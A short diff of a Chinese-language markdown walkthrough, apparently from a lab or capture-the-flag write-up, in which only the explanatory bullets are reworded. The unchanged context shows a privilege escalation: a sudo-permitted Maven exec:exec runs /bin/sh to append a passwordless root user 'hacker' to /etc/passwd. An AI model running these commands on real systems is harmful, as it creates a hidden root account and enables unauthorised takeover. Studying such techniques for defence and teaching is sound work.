@@ -668,7 +668,7 @@ uid=1002(terra536) gid=1002(terra536) groups=1002(terra536)
 bash-5.2# echo 'hacker::0:0:root:/root:/bin/bash' > /tmp/newpasswd
 bash-5.2# sudo /usr/bin/mvn exec:exec -Dexec.executable=/bin/sh -Dexec.args="-c 'cat /tmp/newpasswd >> /etc/passwd'"
 ```
-- 以 root 运行 Maven
-- Maven 执行 `/bin/sh`
+- root 运行 `/usr/bin/mvn`
+- maven 执行 `/bin/sh`
 - `sh` 执行 `cat /tmp/newpasswd >> /etc/passwd`
-- **root 往 `/etc/passwd` 里添加了一行**
+- root 往 `/etc/passwd` 里添加了一行
